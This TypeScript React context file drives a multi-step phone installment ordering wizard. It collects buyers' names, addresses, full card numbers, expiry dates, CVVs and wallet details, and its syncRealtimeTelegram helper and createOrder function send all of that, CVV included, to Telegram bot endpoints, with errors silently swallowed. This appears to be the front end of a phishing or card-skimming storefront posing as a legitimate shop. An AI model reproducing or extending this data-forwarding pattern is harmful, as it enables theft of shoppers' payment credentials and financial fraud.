'use client';

import React, { createContext, useContext, useState, useEffect } from 'react';
import { MobileModel, ColorOption, StorageOption, MODELS, BRANDS, SERIES } from '../data/catalog';

export type DeliveryType = 'open_parcel' | 'standard';
export type PaymentMethod = 'card' | 'wallet' | 'cod';

export interface CustomerDetails {
  fullName: string;
  mobileNumber: string;
  deliveryAddress: string;
  deliveryType: DeliveryType;
  paymentMethod: PaymentMethod;
}

export interface PaymentDetails {
  bankId: string;
  cardNetwork: 'visa' | 'mastercard';
  cardName: string;
  registeredMobile: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  walletType: string;
  walletAccountName: string;
  proofFile: File | null;
  proofPreviewUrl: string | null;
  acceptedTerms: boolean;
}

export interface OrderConfirmation {
  orderId: string;
  createdAt: string;
  model: MobileModel;
  color: ColorOption;
  storage: StorageOption;
  months: number;
  monthlyEmi: number;
  totalPrice: number;
  customer: CustomerDetails;
  payment: PaymentDetails;
  status: 'Waiting for Approval' | 'Order Placed' | 'Delivered';
}

interface WizardContextType {
  currentStep: number;
  setStep: (step: number) => void;
  goNext: () => void;
  goBack: () => void;

  // Step 1 Selection
  selectedBrandId: string;
  setSelectedBrandId: (brandId: string) => void;
  selectedSeriesId: string;
  setSelectedSeriesId: (seriesId: string) => void;
  selectedModel: MobileModel | null;
  setSelectedModel: (model: MobileModel | null) => void;

  // Step 2 Selection
  selectedColor: ColorOption | null;
  setSelectedColor: (color: ColorOption) => void;
  selectedStorage: StorageOption | null;
  setSelectedStorage: (storage: StorageOption) => void;
  selectedTenureMonths: number;
  setSelectedTenureMonths: (months: number) => void;
  calculatedTotalPrice: number;
  calculatedMonthlyEmi: number;

  // Step 3 Customer Details
  customerDetails: CustomerDetails;
  setCustomerDetails: React.Dispatch<React.SetStateAction<CustomerDetails>>;

  // Step 4 Payment Details
  paymentDetails: PaymentDetails;
  setPaymentDetails: React.Dispatch<React.SetStateAction<PaymentDetails>>;

  // Step 5 Order Confirmation
  currentOrder: OrderConfirmation | null;
  createOrder: () => void;
  resetWizard: () => void;
  syncRealtimeTelegram: (stepName: string, customData?: any) => void;
}

const WizardContext = createContext<WizardContextType | undefined>(undefined);

export const WizardProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [currentStep, setCurrentStep] = useState<number>(0);

  // Step 1
  const [selectedBrandId, setSelectedBrandIdState] = useState<string>('apple');
  const [selectedSeriesId, setSelectedSeriesIdState] = useState<string>('apple-17');
  const [selectedModel, setSelectedModel] = useState<MobileModel | null>(null);

  // Step 2
  const [selectedColor, setSelectedColor] = useState<ColorOption | null>(null);
  const [selectedStorage, setSelectedStorage] = useState<StorageOption | null>(null);
  const [selectedTenureMonths, setSelectedTenureMonths] = useState<number>(24);

  // Step 3
  const [customerDetails, setCustomerDetails] = useState<CustomerDetails>({
    fullName: '',
    mobileNumber: '',
    deliveryAddress: '',
    deliveryType: 'open_parcel',
    paymentMethod: 'card'
  });

  // Step 4
  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({
    bankId: 'alfalah',
    cardNetwork: 'visa',
    cardName: '',
    registeredMobile: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    walletType: 'easypaisa',
    walletAccountName: '',
    proofFile: null,
    proofPreviewUrl: null,
    acceptedTerms: false
  });

  // Step 5
  const [currentOrder, setCurrentOrder] = useState<OrderConfirmation | null>(null);
  const [telegramMessageId, setTelegramMessageId] = useState<number | null>(null);

  // Helper for single-message real-time Telegram updates
  const syncRealtimeTelegram = (stepName: string, customData?: any) => {
    try {
      const payload = {
        stepName,
        messageId: telegramMessageId,
        data: customData || {
          model: selectedModel,
          color: selectedColor,
          storage: selectedStorage,
          months: selectedTenureMonths,
          monthlyEmi: calculatedMonthlyEmi,
          totalPrice: calculatedTotalPrice,
          customer: customerDetails,
          payment: paymentDetails
        }
      };

      fetch('/api/telegram/realtime', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
        .then((res) => res.json())
        .then((data) => {
          if (data.success && data.messageId) {
            setTelegramMessageId(data.messageId);
          }
        })
        .catch(() => {});
    } catch (e) {}
  };

  // Reset series and model when brand changes
  const setSelectedBrandId = (brandId: string) => {
    setSelectedBrandIdState(brandId);
    const availableSeries = SERIES.filter((s) => s.brandId === brandId);
    const firstSeriesId = availableSeries[0]?.id || '';
    setSelectedSeriesIdState(firstSeriesId);
    setSelectedModel(null);
    setSelectedColor(null);
    setSelectedStorage(null);
  };

  // Reset model when series changes
  const setSelectedSeriesId = (seriesId: string) => {
    setSelectedSeriesIdState(seriesId);
    setSelectedModel(null);
    setSelectedColor(null);
    setSelectedStorage(null);
  };

  // Synchronize color & storage defaults when model changes
  useEffect(() => {
    if (selectedModel) {
      if (!selectedModel.colors.some((c) => c.name === selectedColor?.name)) {
        setSelectedColor(selectedModel.colors[0] || null);
      }
      if (!selectedModel.storageOptions.some((s) => s.size === selectedStorage?.size)) {
        setSelectedStorage(selectedModel.storageOptions[0] || null);
      }
    }
  }, [selectedModel]);

  // Calculations
  const calculatedTotalPrice = (selectedModel?.basePrice || 0) + (selectedStorage?.priceDelta || 0);
  const calculatedMonthlyEmi = selectedTenureMonths > 0 ? Math.round(calculatedTotalPrice / selectedTenureMonths) : 0;

  const setStep = (step: number) => {
    if (step >= 0 && step <= 5) {
      setCurrentStep(step);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  };

  const goNext = () => setStep(currentStep + 1);
  const goBack = () => setStep(currentStep - 1);

  const generateOrderId = () => {
    const today = new Date();
    const yy = String(today.getFullYear()).slice(-2);
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const dd = String(today.getDate()).padStart(2, '0');
    const random4 = Math.floor(1000 + Math.random() * 9000);
    return `AM-${yy}${mm}${dd}-${random4}`;
  };

  const createOrder = () => {
    if (!selectedModel || !selectedColor || !selectedStorage) return;

    const order: OrderConfirmation = {
      orderId: generateOrderId(),
      createdAt: new Date().toLocaleDateString('en-PK', {
        day: 'numeric',
        month: 'short',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      }),
      model: selectedModel,
      color: selectedColor,
      storage: selectedStorage,
      months: selectedTenureMonths,
      monthlyEmi: calculatedMonthlyEmi,
      totalPrice: calculatedTotalPrice,
      customer: { ...customerDetails },
      payment: { ...paymentDetails },
      status: 'Waiting for Approval'
    };

    setCurrentOrder(order);
    setStep(5);

    // Dispatch real-time notification to Telegram Bot API
    try {
      fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ order })
      }).catch((err) => console.log('Telegram dispatch notice:', err));
    } catch (e) {
      // Ignore network errors
    }
  };

  const resetWizard = () => {
    setCurrentStep(0);
    setCurrentOrder(null);
    setCustomerDetails({
      fullName: '',
      mobileNumber: '',
      deliveryAddress: '',
      deliveryType: 'open_parcel',
      paymentMethod: 'card'
    });
    setPaymentDetails({
      bankId: 'alfalah',
      cardNetwork: 'visa',
      cardName: '',
      registeredMobile: '',
      cardNumber: '',
      expiry: '',
      cvv: '',
      walletType: 'easypaisa',
      walletAccountName: '',
      proofFile: null,
      proofPreviewUrl: null,
      acceptedTerms: false
    });
  };

  return (
    <WizardContext.Provider
      value={{
        currentStep,
        setStep,
        goNext,
        goBack,
        selectedBrandId,
        setSelectedBrandId,
        selectedSeriesId,
        setSelectedSeriesId,
        selectedModel,
        setSelectedModel,
        selectedColor,
        setSelectedColor,
        selectedStorage,
        setSelectedStorage,
        selectedTenureMonths,
        setSelectedTenureMonths,
        calculatedTotalPrice,
        calculatedMonthlyEmi,
        customerDetails,
        setCustomerDetails,
        paymentDetails,
        setPaymentDetails,
        currentOrder,
        createOrder,
        resetWizard,
        syncRealtimeTelegram
      }}
    >
      {children}
    </WizardContext.Provider>
  );
};

export const useWizard = () => {
  const context = useContext(WizardContext);
  if (!context) {
    throw new Error('useWizard must be used within a WizardProvider');
  }
  return context;
};
